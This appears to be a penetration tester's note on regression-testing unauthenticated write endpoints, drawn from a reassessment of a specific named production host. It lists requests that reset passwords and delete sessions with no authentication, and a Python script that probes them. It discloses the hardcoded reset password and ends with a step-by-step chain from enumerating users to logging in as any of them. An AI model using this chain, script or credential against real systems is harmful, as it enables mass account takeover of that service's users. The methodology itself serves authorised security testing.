# Unauthenticated Write Endpoint Regression Testing

## Pattern: Auth Gate Removal on Write Endpoints (BlueSpider, June 2026)

### Discovery
During reassessment of bsjago.aosgraha.com (PROD), endpoints that previously required Super Admin authentication were found to accept requests WITHOUT ANY authentication:

```
POST /api/reset-default-password {"user_id": <any>} → 200 "Password Successfully Reset !"
DELETE /api/user-release/{id} → 200 "Successfully Clear"
POST /api/data-distribution → 200 (processes request, fails on null input)
```

### Root Cause Hypothesis
- Code refactor removed middleware/auth guard from route group
- Original: routes inside `auth:sanctum` middleware group
- Current: routes moved outside or middleware removed during update

### Testing Methodology

**MANDATORY on reassessments:** For EVERY write endpoint found in Phase 6 that required auth in the ORIGINAL engagement, re-test WITHOUT auth in the reassessment:

```python
import requests

write_endpoints = [
    ('POST', '/api/reset-default-password', {'user_id': 999999}),
    ('DELETE', '/api/user-release/999999', None),
    ('POST', '/api/data-distribution', {'userId': '1'}),
    ('PATCH', '/api/update-user/999999', {'name': 'test'}),
]

for method, path, body in write_endpoints:
    r = requests.request(method, f'{BASE}{path}', json=body, verify=False, timeout=8)
    if r.status_code in (200, 201, 204):
        print(f'[CRITICAL] {method} {path}: {r.status_code} — {r.text[:100]}')
```

### Key Lessons

1. **passDefault param null ≠ reset disabled**: The `/api/get-params/passDefault` returned `param_value: null` (appears "fixed"), but `POST /api/reset-default-password` still works and resets to a hardcoded server-side value (`JAGO1234!`). The display param and actual reset logic are DECOUPLED.

2. **204 on Laravel Sanctum login = success**: When using `Accept: application/json`, Laravel Sanctum returns 204 (no content) on successful login instead of 302 redirect. This is by design — the SPA fetches user data separately.

3. **Test with non-existent IDs first, real IDs second**: Use `user_id: 999999` to prove the endpoint processes requests. If it returns success (not 404/422), the auth bypass is confirmed without affecting real users.

4. **Always test write methods on READ endpoints too**: If `GET /api/load-user` works without auth, test `POST /api/load-user`, `DELETE /api/load-user/1`, etc. — same missing middleware may apply to all methods on that route group.

### Severity
- Unauthenticated password reset on production = **Critical** (mass ATO)
- Unauthenticated force-logout = **High** (operational DoS)
- Unauthenticated data-distribution = **Medium** (fails on null but route accepts)

### Attack Chain
```
1. GET /api/load-user → 166 users + IDs (no auth)
2. POST /api/reset-default-password {user_id: X} → reset to JAGO1234! (no auth)
3. POST /login email + JAGO1234! → 204 (authenticated session)
4. Access all authenticated endpoints as victim
```
